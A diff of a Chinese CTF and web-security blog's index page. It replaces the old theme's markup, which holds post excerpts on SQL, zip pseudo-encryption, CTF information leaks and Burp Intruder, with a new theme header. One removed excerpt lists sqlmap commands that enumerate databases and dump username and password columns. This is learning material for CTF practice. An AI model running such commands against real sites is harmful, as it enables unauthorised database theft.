@@ -1,1197 +1,324 @@
-<!DOCTYPE html>
-<html lang="en">
-
-<!-- Head tag -->
-<head>
-
-    <meta charset="utf-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-
-    <!--Description-->
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>h3110w0r1d's Blog - we can be what we are willing to be</title><meta name="author" content="h3110w0r1d"><meta name="copyright" content="h3110w0r1d"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="CTF web手、Golang后端开发工程师 研究多线程高并发、渗透测试      Web安全">
+<meta property="og:type" content="website">
+<meta property="og:title" content="h3110w0r1d&#39;s Blog">
+<meta property="og:url" content="http://dezhoutorizhao.github.io/page/10/index.html">
+<meta property="og:site_name" content="h3110w0r1d&#39;s Blog">
+<meta property="og:description" content="CTF web手、Golang后端开发工程师 研究多线程高并发、渗透测试      Web安全">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/QQ图片20240111033823.jpg">
+<meta property="article:author" content="h3110w0r1d">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/QQ图片20240111033823.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://dezhoutorizhao.github.io/page/10/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.12.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.32/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'h3110w0r1d\'s Blog',
+  isPost: false,
+  isHome: true,
+  isHighlightShrink: false,
+  isToc: false,
+  postUpdate: '2024-01-15 13:56:44'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
     
-        <meta name="description" content="CTF web手、Golang后端开发工程师 研究多线程高并发、渗透测试      Web安全">
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
     
-
-    <!--Author-->
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
     
-        <meta name="author" content="h3110w0r1d">
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
     
-
-    <!--Open Graph Title-->
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
     
-        <meta property="og:title" content="h3110w0r1d&#39;s Blog"/>
-    
-
-    <!--Open Graph Description-->
-    
-        <meta property="og:description" content="CTF web手、Golang后端开发工程师 研究多线程高并发、渗透测试      Web安全" />
-    
-
-    <!--Open Graph Site Name-->
-    <meta property="og:site_name" content="h3110w0r1d&#39;s Blog"/>
-
-    <!--Type page-->
-    
-        <meta property="og:type" content="website" />
-    
-
-    <!--Page Cover-->
-    
-
-    
-        <meta name="twitter:card" content="summary" />
-    
-    
-    
-
-    <!-- Title -->
-    
-    <title>page - h3110w0r1d&#39;s Blog</title>
-
-    <!-- Bootstrap Core CSS -->
-    <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">
-
-    <!-- Custom Fonts -->
-    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">
-
-    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
-    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
-    <!--[if lt IE 9]>
-        <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
-        <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
-    <![endif]-->
-
-    <!-- Gallery -->
-    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet" />
-
-    <!-- Custom CSS -->
-    
-<link rel="stylesheet" href="/css/style.css">
-
-
-    <!-- Google Analytics -->
-    
-
-
-<meta name="generator" content="Hexo 5.4.0"></head>
-
-
-<body>
-
-<div class="bg-gradient"></div>
-<div class="bg-pattern"></div>
-
-<!-- Menu -->
-<!--Menu Links and Overlay-->
-<div class="menu-bg">
-    <div class="menu-container">
-        <ul>
-            
-            <li class="menu-item">
-                <a href="/">
-                    Home
-                </a>
-            </li>
-            
-            <li class="menu-item">
-                <a href="/archives">
-                    Archives
-                </a>
-            </li>
-            
-            <li class="menu-item">
-                <a href="/about.html">
-                    About
-                </a>
-            </li>
-            
-            <li class="menu-item">
-                <a href="/tags">
-                    Tags
-                </a>
-            </li>
-            
-            <li class="menu-item">
-                <a href="/categories">
-                    Categories
-                </a>
-            </li>
-            
-            <li class="menu-item">
-                <a href="/contact.html">
-                    Contact
-                </a>
-            </li>
-            
-        </ul>
-    </div>
-</div>
-
-<!--Hamburger Icon-->
-<nav>
-    <a href="#menu"></a>
-</nav>
-
-<div class="container">
-
-    <!-- Main Content -->
-    <div class="row">
-    <div class="col-sm-12">
-
-        <!--Title and Logo-->
-        <header>
-    <div class="logo">
-        <a href="/"><i class="logo-icon fa fa-cube" aria-hidden="true"></i></a>
-        
-            <h1 id="main-title" class="title">h3110w0r1d's Blog</h1>
-        
-    </div>
-</header>
-
-        <section class="main">
-            
-                
-<div class="post">
-
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/create%20tables%E9%80%89%E9%A1%B9/">
-                sql约束
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2022-03-29</span>
-            
-            
-                <a href="http://dezhoutorizhao.github.io/create%20tables%E9%80%89%E9%A1%B9/#disqus_thread" class="comments article-comment-link">留言</a>
-            
-            
-                <span class="category">
-                    <a href="/categories/数据库/">数据库</a>
-                </span>
-            
-        </div>
-    </div>
-
-    
-        <div class="content">
-            <h1 id="create-tables选项"><a href="#create-tables选项" class="headerlink" title="create tables选项"></a>create tables选项</h1><h2 id="定义列的时候，指定列选项"><a href="#定义列的时候，指定列选项" class="headerlink" title="定义列的时候，指定列选项"></a>定义列的时候，指定列选项</h2><h2 id="约束的概念"><a href="#约束的概念" class="headerlink" title="约束的概念"></a>约束的概念</h2><ol>
-<li>对表中的数据进行限定，保证数据的正确性。有效性和完整性<h3 id="DEFAULT-定义列的默认值"><a href="#DEFAULT-定义列的默认值" class="headerlink" title="DEFAULT 定义列的默认值"></a>DEFAULT 定义列的默认值</h3></li>
-<li>当插入一个新行到表中并且没有给该列明确赋值时，如果定义了列的默认值，将自动得到默认值，如果没有为null</li>
-<li>sex char(1) default ‘m’</li>
-</ol>
-<h3 id="COMMENT-用来给列添加注释，最多255个字符，注释保存到数据字典中"><a href="#COMMENT-用来给列添加注释，最多255个字符，注释保存到数据字典中" class="headerlink" title="COMMENT 用来给列添加注释，最多255个字符，注释保存到数据字典中"></a>COMMENT 用来给列添加注释，最多255个字符，注释保存到数据字典中</h3><ol>
-<li>创建带有列注释的表stu_comment<br>create table stu_comment(<br> id int not null primary key,<br> comment ‘学号’<br> name varchar(20) not null,<br> comment ‘姓名’<br>);<h4 id="从数据字典查询注释信息"><a href="#从数据字典查询注释信息" class="headerlink" title="从数据字典查询注释信息"></a>从数据字典查询注释信息</h4></li>
-<li>select comumn_name,column_comment</li>
-<li>from information_schema.columns</li>
-<li>where table_name=’stu_comment’</li>
-</ol>
-<h1 id="常见的约束类型"><a href="#常见的约束类型" class="headerlink" title="常见的约束类型"></a>常见的约束类型</h1><ol>
-<li>not null 非空类型，指定某列不为空</li>
-<li>unique 唯一约束，指定某列和几列组合的数据不能重复</li>
-<li>primary key 主键约束，指定某列的数据不能重复</li>
-<li>foreign key 外键,指定该列记录属于主表中的一条记录，参照另一条数据</li>
-<li>check 检查，指定一个表达式，用于检验指定数据</li>
-</ol>
-<p>CREATE TABLE table_name(<br>    column_name datetype [not null] [unique key] [primary key] [check(expr)]<br>);</p>
-
-        </div>
-    
-
-</div>
-            
-                
-<div class="post">
-
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/foreign%20key%E7%94%A8%E6%B3%95%E8%AF%A6%E8%A7%A3/">
-                foreign key用法详解
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2022-03-29</span>
-            
-            
-                <a href="http://dezhoutorizhao.github.io/foreign%20key%E7%94%A8%E6%B3%95%E8%AF%A6%E8%A7%A3/#disqus_thread" class="comments article-comment-link">留言</a>
-            
-            
-                <span class="category">
-                    <a href="/categories/数据库/">数据库</a>
-                </span>
-            
-        </div>
-    </div>
-
-    
-        <div class="content">
-            <h1 id="foreign-key用法详解"><a href="#foreign-key用法详解" class="headerlink" title="foreign key用法详解"></a>foreign key用法详解</h1><h2 id="引子：把所有数据都存放于一张表的弊端"><a href="#引子：把所有数据都存放于一张表的弊端" class="headerlink" title="引子：把所有数据都存放于一张表的弊端"></a>引子：把所有数据都存放于一张表的弊端</h2><ol>
-<li>组织结构复杂比清晰</li>
-<li>浪费空间</li>
-<li>拓展性差</li>
-</ol>
-<h2 id="表和表之间存在的三种关系"><a href="#表和表之间存在的三种关系" class="headerlink" title="表和表之间存在的三种关系"></a>表和表之间存在的三种关系</h2><ol>
-<li>一对多</li>
-<li>多对多</li>
-<li>一对一</li>
-</ol>
-<h3 id="多对多"><a href="#多对多" class="headerlink" title="多对多"></a>多对多</h3><ol>
-<li>先站在表emp的角度</li>
-<li>去找表emp的多条记录能否对应表dep的一条记录。</li>
-<li>翻译2的意义：</li>
-<li>左表emp的多条记录==》多个员工</li>
-<li>右表dep的一条记录==》一个部门</li>
-<li>最终翻译结果：多个员工是否可以属于一个部门？</li>
-<li>如果是则需要进行part2的流程</li>
-</ol>
-
-        </div>
-    
-
-</div>
-            
-                
-<div class="post">
-
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/zip%E4%BC%AA%E5%8A%A0%E5%AF%86%E5%8F%82%E8%80%83%E5%8D%9A%E5%AE%A2%E5%9C%B0%E5%9D%80/">
-                zip伪加密
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2022-03-27</span>
-            
-            
-                <a href="http://dezhoutorizhao.github.io/zip%E4%BC%AA%E5%8A%A0%E5%AF%86%E5%8F%82%E8%80%83%E5%8D%9A%E5%AE%A2%E5%9C%B0%E5%9D%80/#disqus_thread" class="comments article-comment-link">留言</a>
-            
-            
-                <span class="category">
-                    <a href="/categories/CTF/">CTF</a>
-                </span>
-            
-        </div>
-    </div>
-
-    
-        <div class="content">
-            <h1 id="参考博客地址"><a href="#参考博客地址" class="headerlink" title="参考博客地址"></a>参考博客地址</h1><ol>
-<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/cute-puli/p/16042101.html">https://www.cnblogs.com/cute-puli/p/16042101.html</a></li>
-</ol>
-<h1 id="zip伪加密"><a href="#zip伪加密" class="headerlink" title="zip伪加密"></a>zip伪加密</h1><h2 id="010或者winhex"><a href="#010或者winhex" class="headerlink" title="010或者winhex"></a>010或者winhex</h2><ol>
-<li>建议使用010editor</li>
-<li>因为可以自动区分数据区，目录区和目录结束标志<h3 id="zip文件组成"><a href="#zip文件组成" class="headerlink" title="zip文件组成"></a>zip文件组成</h3></li>
-<li>压缩源文件数据区</li>
-<li>压缩源文件目录区</li>
-<li>压缩源文件目录结束标志</li>
-</ol>
-<h1 id="奇数为加密，偶数为不加密"><a href="#奇数为加密，偶数为不加密" class="headerlink" title="奇数为加密，偶数为不加密"></a>奇数为加密，偶数为不加密</h1><h1 id="无加密："><a href="#无加密：" class="headerlink" title="无加密："></a>无加密：</h1><ol>
-<li>压缩源文件数据区的全局加密应为00 00</li>
-<li>压缩源文件目录区的全局方式位标记应为00 00</li>
-</ol>
-<h1 id="假加密"><a href="#假加密" class="headerlink" title="假加密"></a>假加密</h1><ol>
-<li>压缩源文件数据区的全局加密应为00 00</li>
-<li>压缩源文件目录区的全局加密方式应为 00 90</li>
-</ol>
-<h1 id="真加密"><a href="#真加密" class="headerlink" title="真加密"></a>真加密</h1><ol>
-<li>压缩源文件数据区的全局加密应为00 00</li>
-<li>压缩源文件目录去的全局方式应为00 90</li>
-</ol>
-<p>压缩源文件数据区：<br>50 4B 03 04：这是头文件标记（0x04034b50）<br>14 00：解压文件所需 pkware 版本<br>00 00：全局方式位标记（有无加密）<br>08 00：压缩方式<br>5A 7E：最后修改文件时间<br>F7 46：最后修改文件日期<br>16 B5 80 14：CRC-32校验（1480B516）<br>19 00 00 00：压缩后尺寸（25）<br>17 00 00 00：未压缩尺寸（23）<br>07 00：文件名长度<br>00 00：扩展记录长度</p>
-<p>压缩源文件目录区：<br>50 4B 01 02：目录中文件文件头标记(0x02014b50)<br>3F 00：压缩使用的 pkware 版本<br>14 00：解压文件所需 pkware 版本<br>00 00：全局方式位标记（有无加密，这个更改这里进行伪加密，改为09 00打开就会提示有密码了）<br>08 00：压缩方式<br>5A 7E：最后修改文件时间<br>F7 46：最后修改文件日期<br>16 B5 80 14：CRC-32校验（1480B516）<br>19 00 00 00：压缩后尺寸（25）<br>17 00 00 00：未压缩尺寸（23）<br>07 00：文件名长度<br>24 00：扩展字段长度<br>00 00：文件注释长度<br>00 00：磁盘开始号<br>00 00：内部文件属性<br>20 00 00 00：外部文件属性<br>00 00 00 00：局部头部偏移量</p>
-<p>压缩源文件目录结束标志：<br>50 4B 05 06：目录结束标记<br>00 00：当前磁盘编号<br>00 00：目录区开始磁盘编号<br>01 00：本磁盘上纪录总数<br>01 00：目录区中纪录总数<br>59 00 00 00：目录区尺寸大小<br>3E 00 00 00：目录区对第一张磁盘的偏移量<br>00 00：ZIP 文件注释长度</p>
-
-        </div>
-    
-
-</div>
-            
-                
-<div class="post">
-
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/">
-                信息泄露
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2022-03-27</span>
-            
-            
-                <a href="http://dezhoutorizhao.github.io/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/#disqus_thread" class="comments article-comment-link">留言</a>
-            
-            
-                <span class="category">
-                    <a href="/categories/信息泄露/">信息泄露</a>
-                </span>
-            
-        </div>
-    </div>
-
-    
-        <div class="content">
-            <h1 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h1><h1 id="备份文件下载"><a href="#备份文件下载" class="headerlink" title="备份文件下载"></a>备份文件下载</h1><h2 id="网站源码"><a href="#网站源码" class="headerlink" title="网站源码"></a>网站源码</h2><h2 id="bak文件下载"><a href="#bak文件下载" class="headerlink" title="bak文件下载"></a>bak文件下载</h2><ol>
-<li>访问目录下的bak文件</li>
-<li>题目提示source 在index.php下，所以用hackbar访问index.php.bak</li>
-<li>将bak文件后缀改为txt或者用notepad++打开即可获得flag</li>
-</ol>
-<h2 id="vim缓存"><a href="#vim缓存" class="headerlink" title="vim缓存"></a>vim缓存</h2><ol>
-<li>vim会自动生成备份文件和临时文件</li>
-<li>临时文件是在编辑文本时就会创建的文件，如果程序正常退出，临时文件自动删除</li>
-<li>如果意外退出则会保留，名为.filename.swp</li>
-<li>第一次产生的交换文件名为“.filename.txt.swp”；再次意外退出后，将会产生名为“.filename.txt.swo”的交换文件；而第三次产生的交换文件则为“.filename.txt.swn</li>
-<li>因为这里已经告诉我们是index.php了，所以其意外退出而保留的临时文件是 .index.php.swp</li>
-</ol>
-<h2 id="phpinfo"><a href="#phpinfo" class="headerlink" title="phpinfo"></a>phpinfo</h2><ol>
-<li>直接打开页面发现是phpinfo界面</li>
-<li>思路是从表中搜索flag的信息</li>
-<li>浏览器中ctrl+f查找（和wires hark相同）flag</li>
-</ol>
-<h1 id="信息泄露问题"><a href="#信息泄露问题" class="headerlink" title="信息泄露问题"></a>信息泄露问题</h1><h2 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h2><ol>
-<li>用菜刀爬或者用御剑字典爆破搜就完了</li>
-<li><a target="_blank" rel="noopener" href="https://imgtu.com/i/H2keX9"><img src="https://s4.ax1x.com/2022/02/15/H2keX9.md.png" alt="H2keX9.md.png"></a></li>
-<li>观察之间的不同</li>
-<li>一开始我还以为c=d o=a之类的是将下部的challenge那一串替换，结果发现我想多了</li>
-<li>里面有flag_in_here.txt，双击打开后发现了flag</li>
-<li><a target="_blank" rel="noopener" href="https://imgtu.com/i/H2AV4f"><img src="https://s4.ax1x.com/2022/02/15/H2AV4f.md.png" alt="H2AV4f.md.png"></a></li>
-</ol>
-
-        </div>
-    
-
-</div>
-            
-                
-<div class="post">
-
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/burpsuit%20intruder%E7%9A%84%E5%9B%9B%E7%A7%8D%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/">
-                burpsuit intruder的四种攻击方式
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2022-03-26</span>
-            
-            
-                <a href="http://dezhoutorizhao.github.io/burpsuit%20intruder%E7%9A%84%E5%9B%9B%E7%A7%8D%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/#disqus_thread" class="comments article-comment-link">留言</a>
-            
-            
-                <span class="category">
-                    <a href="/categories/CTF/">CTF</a>
-                </span>
-            
-        </div>
-    </div>
-
-    
-        <div class="content">
-            <h1 id="burpsuit-intruder的四种攻击方式"><a href="#burpsuit-intruder的四种攻击方式" class="headerlink" title="burpsuit intruder的四种攻击方式"></a>burpsuit intruder的四种攻击方式</h1><h2 id="sniper狙击手模式"><a href="#sniper狙击手模式" class="headerlink" title="sniper狙击手模式"></a>sniper狙击手模式</h2><ol>
-<li>使用一组payload集合，一次只使用一个payload位置<h2 id="battering-ram-攻城锤模式"><a href="#battering-ram-攻城锤模式" class="headerlink" title="battering ram 攻城锤模式"></a>battering ram 攻城锤模式</h2></li>
-<li>只使用一个payload集合，每次攻击都是替换所有payload标记位置</li>
-<li>与狙击手模式不同点在于狙击手每次只替换一个标记位置，而攻城锤替换所有的标记位置<h2 id="三Pitchfork（草叉模式）"><a href="#三Pitchfork（草叉模式）" class="headerlink" title="三Pitchfork（草叉模式）"></a>三Pitchfork（草叉模式）</h2><h2 id="四Cluster-bomb（集束炸弹模式）"><a href="#四Cluster-bomb（集束炸弹模式）" class="headerlink" title="四Cluster bomb（集束炸弹模式）"></a>四Cluster bomb（集束炸弹模式）</h2></li>
-</ol>
-
-        </div>
-    
-
-</div>
-            
-                
-<div class="post">
-
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/sqlmap%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/">
-                sqlmap使用方法
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2022-03-23</span>
-            
-            
-                <a href="http://dezhoutorizhao.github.io/sqlmap%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/#disqus_thread" class="comments article-comment-link">留言</a>
-            
-            
-                <span class="category">
-                    <a href="/categories/CTF/">CTF</a>
-                </span>
-            
-        </div>
-    </div>
-
-    
-        <div class="content">
-            <h1 id="sqlmap使用方法"><a href="#sqlmap使用方法" class="headerlink" title="sqlmap使用方法"></a>sqlmap使用方法</h1><h2 id="判断是否能注入"><a href="#判断是否能注入" class="headerlink" title="判断是否能注入"></a>判断是否能注入</h2><ol>
-<li>python sqlmap.py -u “url?id=1”<h2 id="找库"><a href="#找库" class="headerlink" title="找库"></a>找库</h2></li>
-<li>python sqlmap.py -u “url?id=1” –dbs</li>
-</ol>
-<h2 id="找表"><a href="#找表" class="headerlink" title="找表"></a>找表</h2><ol>
-<li>python sqlmap.py -u “url?id=1” -D 库名 –tables</li>
-</ol>
-<h2 id="找列"><a href="#找列" class="headerlink" title="找列"></a>找列</h2><ol>
-<li>python sqlmap.py -u “url?id=1” -D 库名 -T 表名 –columns</li>
-</ol>
-<h2 id="dump掉信息"><a href="#dump掉信息" class="headerlink" title="dump掉信息"></a>dump掉信息</h2><ol>
-<li>python sqlmap.py -u “url?id=1” -D 库名 -T 表名 -C 列名 –dump</li>
-<li>或者列名前加–columns</li>
-</ol>
-<h1 id="参考博客"><a href="#参考博客" class="headerlink" title="参考博客"></a>参考博客</h1><ol>
-<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/ichunqiu/p/5805108.html">https://www.cnblogs.com/ichunqiu/p/5805108.html</a></li>
-</ol>
-<h1 id="嗅探等级："><a href="#嗅探等级：" class="headerlink" title="嗅探等级："></a>嗅探等级：</h1><h2 id="不加level时默认为1，5级包含的payload最多，会自动破解出cookie和XFF等头部注入，相对应的速度也较慢"><a href="#不加level时默认为1，5级包含的payload最多，会自动破解出cookie和XFF等头部注入，相对应的速度也较慢" class="headerlink" title="不加level时默认为1，5级包含的payload最多，会自动破解出cookie和XFF等头部注入，相对应的速度也较慢"></a>不加level时默认为1，5级包含的payload最多，会自动破解出cookie和XFF等头部注入，相对应的速度也较慢</h2><h2 id="当不能确定哪个payload时或参数作为注入点，可以使用较高的level值"><a href="#当不能确定哪个payload时或参数作为注入点，可以使用较高的level值" class="headerlink" title="当不能确定哪个payload时或参数作为注入点，可以使用较高的level值"></a>当不能确定哪个payload时或参数作为注入点，可以使用较高的level值</h2><h2 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h2><ol>
-<li>http cookie测试</li>
-</ol>
-<h2 id="level-3"><a href="#level-3" class="headerlink" title="level 3"></a>level 3</h2><ol>
-<li>http user-agent/referer头回测试</li>
-</ol>
-<h1 id="参考博客-1"><a href="#参考博客-1" class="headerlink" title="参考博客"></a>参考博客</h1><ol>
-<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/a_small_rabbit/article/details/101110011">https://blog.csdn.net/a_small_rabbit/article/details/101110011</a></li>
-</ol>
-<h1 id="post注入"><a href="#post注入" class="headerlink" title="post注入"></a>post注入</h1><ol>
-<li>用burp抓包</li>
-<li>将抓到的包保存为.txt文件类型(右击，copy to file)</li>
-<li>sqlmap中的命令：sqlmap -r “admin.txt” -p n –dbs(-r表示加载一个文件，-p指定参数)</li>
-<li>sqlmap -r “admin.txt” -p n -D 暴库名 –tables</li>
-<li>sqlmap -r “admin.txt” -p n -D 暴库名 -T 表名 –columns</li>
-<li>sqlmap -r “admin.txt” -p n -D 暴库名 -T 表名 -C “username,password” –dump</li>
-</ol>
-<h2 id="指定参数（get传参来实现post注入）"><a href="#指定参数（get传参来实现post注入）" class="headerlink" title="指定参数（get传参来实现post注入）"></a>指定参数（get传参来实现post注入）</h2><ol>
-<li>sqlmap -u “url” –data “n=1&amp;p=1” –dbs(与上面类似)</li>
-<li>sqlmap -u “url” –data “username=1&amp;password=1” –dbs(假设参数是username和password)</li>
-</ol>
-<h2 id="r指定文件去暴库"><a href="#r指定文件去暴库" class="headerlink" title="-r指定文件去暴库"></a>-r指定文件去暴库</h2><ol>
-<li>python sqlmap.py -r 文件路径+文件名.txt –dbs</li>
-</ol>
-<h2 id="forms"><a href="#forms" class="headerlink" title="-forms"></a>-forms</h2><ol>
-<li>使用该命令，使sqlmap自己抓包</li>
-<li>sqlmap -u “url” –forms –level=5 –dbs</li>
-</ol>
-
-        </div>
-    
-
-</div>
-            
-                
-<div class="post">
-
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/n%E7%9A%84%E4%BA%8C%E8%BF%9B%E5%88%B6%E8%A1%A8%E7%A4%BA%E4%B8%AD%E7%AC%ACk%E4%BD%8D%E6%95%B0%E5%AD%97%E6%98%AF%E5%87%A0/">
-                n的二进制表示中第k位数字是几
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2022-03-05</span>
-            
-            
-                <a href="http://dezhoutorizhao.github.io/n%E7%9A%84%E4%BA%8C%E8%BF%9B%E5%88%B6%E8%A1%A8%E7%A4%BA%E4%B8%AD%E7%AC%ACk%E4%BD%8D%E6%95%B0%E5%AD%97%E6%98%AF%E5%87%A0/#disqus_thread" class="comments article-comment-link">留言</a>
-            
-            
-                <span class="category">
-                    <a href="/categories/acm算法/">acm算法</a>
-                </span>
-            
-        </div>
-    </div>
-
-    
-        <div class="content">
-            <h1 id="n的二进制表示中第k位数字是几"><a href="#n的二进制表示中第k位数字是几" class="headerlink" title="n的二进制表示中第k位数字是几"></a>n的二进制表示中第k位数字是几</h1><ol>
-<li>先把第k位数字移到最后一位 n&gt;&gt;k</li>
-<li>看个位是几 x&amp;1<h2 id="除以2相当于二进制数右移1位"><a href="#除以2相当于二进制数右移1位" class="headerlink" title="除以2相当于二进制数右移1位"></a>除以2相当于二进制数右移1位</h2></li>
-<li>即右移1位相当于除以2，相当于除去二进制数中的下一位<h2 id="按位与操作："><a href="#按位与操作：" class="headerlink" title="按位与操作："></a>按位与操作：</h2></li>
-<li>相当于取出某一位</li>
-<li>int a = 1010</li>
-<li>a &amp; 1 = 0</li>
-<li>a &amp; 11 = 2  (10的二进制表示为2)</li>
-</ol>
-<h1 id="lowbit操作"><a href="#lowbit操作" class="headerlink" title="lowbit操作"></a>lowbit操作</h1><ol>
-<li>lowbit(x)是返回x的最后一位1</li>
-<li>相当于x&amp;-x=x&amp;(~x+1)</li>
-</ol>
-
-        </div>
-    
-
-</div>
-            
-                
-<div class="post">
-
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/%E6%89%8B%E5%8A%A8%E6%B3%A8%E5%85%A5%E8%AF%AD%E6%B3%95/">
-                sql注入漏洞
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2022-02-15</span>
-            
-            
-                <a href="http://dezhoutorizhao.github.io/%E6%89%8B%E5%8A%A8%E6%B3%A8%E5%85%A5%E8%AF%AD%E6%B3%95/#disqus_thread" class="comments article-comment-link">留言</a>
-            
-            
-                <span class="category">
-                    <a href="/categories/CTF/">CTF</a>
-                </span>
-            
-        </div>
-    </div>
-
-    
-        <div class="content">
-            <h1 id="sql注入漏洞"><a href="#sql注入漏洞" class="headerlink" title="sql注入漏洞"></a>sql注入漏洞</h1><h2 id="对information-shcema的理解"><a href="#对information-shcema的理解" class="headerlink" title="对information_shcema的理解"></a>对information_shcema的理解</h2><ol>
-<li>shcema可以看作是房间</li>
-<li>table_schema是用来存放table表的房间，是数据库</li>
-<li>table_name是表的名字</li>
-<li>table_type是表的类型</li>
-</ol>
